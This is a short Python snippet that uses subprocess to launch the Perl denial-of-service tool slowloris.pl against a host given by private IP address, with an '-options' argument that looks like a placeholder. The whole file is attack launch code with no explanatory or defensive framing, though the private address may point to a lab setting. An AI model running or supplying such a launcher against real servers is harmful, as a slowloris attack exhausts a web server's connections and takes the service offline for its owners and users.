import subprocess
pipe = subprocess.Popen(["perl", "./slowloris.pl", "-dns", "10.197.146.191", "-options"], stdin=subprocess.PIPE)
pipe.stdin.close()